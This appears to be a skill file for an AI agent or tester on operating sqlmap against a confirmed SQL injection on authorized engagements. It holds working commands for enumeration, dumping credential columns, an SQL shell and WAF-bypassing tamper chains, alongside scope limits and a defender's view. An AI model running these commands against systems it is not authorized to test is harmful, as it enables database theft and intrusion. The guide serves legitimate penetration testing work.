---
name: sqlmap-automation
description: Use when a SQL injection point is confirmed and you want sqlmap
  1.9.2 to automate detection, enumeration, and dumping on an authorized
  engagement. Covers request files, technique selection, tamper scripts,
  throttling for fragile targets, second-order handling, and safe dumping
  discipline. Use when manual extraction would take too long, when you need
  systematic database enumeration, when filters need tamper bypasses, or
  when you want an interactive SQL shell on a confirmed injection.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: 2026-10-23
parent: web-sqli
requires: [web-sqli]
extends: []
relates: [api-security-testing]
tools:
  - name: sqlmap
    version: 1.9.2
  - name: Burp Suite
    version: 2026.2
  - name: Python
    version: 3.12
---

sqlmap automates the full SQL injection workflow: heuristic detection,
technique selection, fingerprinting, enumeration, and dumping. This skill
covers operating sqlmap 1.9.2 on authorized engagements with the right
discipline: start narrow, widen only with permission, throttle on fragile
targets, and dump the minimum data that proves impact. It assumes the point
is already a candidate; blindly pointing sqlmap at a whole site is what
sqli-detection exists to avoid.

## Quick Workflow

1. Capture the exact request in Burp and save it as a request file.
2. Run detection only (`--batch`) against the marked parameter.
3. Review what sqlmap found: injection class, DBMS, technique.
4. Enumerate narrowly: current user, current database, list of databases.
5. Enumerate the target schema: tables, then columns, then a limited dump.
6. Use tamper scripts and delays when filters or fragile infrastructure
   demand it.
7. Save the session log and the exact commands for the report.

## 1. Detection runs

Always start from a request file so sqlmap replays the exact request,
including cookies and headers.

```bash
# Basic detection on a saved request, non-interactive
sqlmap -r /tmp/login.req --batch

# Mark the exact parameter when several exist
sqlmap -u "https://target.example/item?id=1" --batch

# POST form with session cookie
sqlmap -u "https://target.example/search" --data="q=test*" \
  --cookie="session=abc123" --batch

# JSON body: mark the injectable field with *
sqlmap -u "https://target.example/api/search" \
  --data='{"q":"test*","page":1}' --batch

# Route through Burp to inspect what sqlmap actually sends
sqlmap -u "https://target.example/item?id=1" --batch \
  --proxy=http://127.0.0.1:8080
```

Read the detection output before enumerating. If sqlmap says the parameter
is not injectable but your manual probes disagreed, save the manual request
as a file and rerun with `-r` before trusting the negative.

## 2. Controlled enumeration

Widen one step at a time. Each flag below is a separate, reviewable step.

```bash
# Fingerprint: user, database, version, list of databases
sqlmap -u "https://target.example/item?id=1" --batch \
  --current-user --current-db --banner --dbs

# Tables in the target database
sqlmap -u "https://target.example/item?id=1" --batch \
  -D targetdb --tables

# Columns of the interesting table
sqlmap -u "https://target.example/item?id=1" --batch \
  -D targetdb -T users --columns

# Dump specific columns, limited rows
sqlmap -u "https://target.example/item?id=1" --batch \
  -D targetdb -T users -C username,password --dump --start=1 --stop=5

# Interactive SQL shell on the confirmed injection
sqlmap -u "https://target.example/item?id=1" --batch --sql-shell
```

Dump discipline: name the columns, cap the rows, never `--dump-all` on a
production database. The report needs proof of access, not the customer
table.

## 3. Filters, throttling, and second-order

```bash
# Tamper scripts for basic keyword and space filters
sqlmap -u "https://target.example/item?id=1" --batch \
  --tamper=space2comment --random-agent

# Chain tampers when one is not enough
sqlmap -u "https://target.example/item?id=1" --batch \
  --tamper=space2comment,between,randomcase

# Fragile target: one thread, delay between requests, generous timeout
sqlmap -u "https://target.example/item?id=1" --batch \
  --threads=1 --delay=1 --timeout=30 --retries=2

# Limit to UNION technique when you know output is visible
sqlmap -u "https://target.example/item?id=1" --batch --technique=U

# Raise level and risk only with explicit permission
sqlmap -u "https://target.example/item?id=1" --batch --level=5 --risk=3

# Second-order: inject at registration, check the profile page
sqlmap -u "https://target.example/register" --data="user=test*&pass=x" \
  --second-url="https://target.example/profile" --batch

# Fresh session per target so cached results never leak across tests
sqlmap -u "https://target.example/item?id=1" --batch --flush-session
```

`--batch` is mandatory for unattended runs: sqlmap must never stop to ask a
question mid-engagement. `--flush-session` between targets keeps results
honest.

## Edge cases

- sqlmap detects nothing but manual probes worked. The request file differs
  from your manual request (encoding, header order, cookie). Diff them and
  rerun with `-r` until they match.
- The target rate-limits sqlmap. Drop to `--threads=1 --delay=2`, or run
  detection only and do the slow parts manually.
- CSRF tokens expire between runs. Use `--csrf-token` handling or refresh
  the request file before each run.
- Login sessions expire mid-enumeration. Re-authenticate, update the cookie
  in the request file, and rerun with `--flush-session`.
- The database is huge and enumeration crawls. Target one database with
  `-D`, exclude system schemas, and set `--exclude-sysdbs`.

## Escalation

- `--os-shell` or file read/write is requested: only with explicit written
  permission in the rules of engagement, and stop at a harmless proof such
  as reading one non-sensitive file.
- Tamper scripts fail against a strong WAF: document the block, try
  `--technique=B` (boolean blind needs fewer keywords), or hand the point
  to sqli-manual-fallback for a crafted manual bypass.
- sqlmap crashes on an unusual DBMS: pin the DBMS with `--dbms=mysql` (or
  the fingerprinted engine) to skip the fingerprinting heuristics.
- You need evidence of exactly what was sent: the `--proxy` run through
  Burp plus `--output-dir` gives you the full request log for the report.

## Detection and defender view

Defenders see sqlmap as bursts of requests with its default User-Agent (or a
rotated one with `--random-agent`), heavy use of SQL keywords and tamper
patterns, and long sessions enumerating `information_schema`. It is one of
the easiest tools to signature, which is why manual fallback exists. Defense
is the standard set: parameterized queries, WAF rules for automation
patterns, rate limiting per session, and alerting on enumeration-like
request sequences.

## Key references

- MITRE ATT&CK T1190 (Exploit Public-Facing Application).
- CWE-89 (Improper Neutralization of Special Elements used in an SQL
  Command, SQL Injection).
- sqlmap 1.9.2 usage guide: https://sqlmap.org/usage/
- OWASP Testing Guide: Testing for SQL Injection (OTG-INPVAL-005).
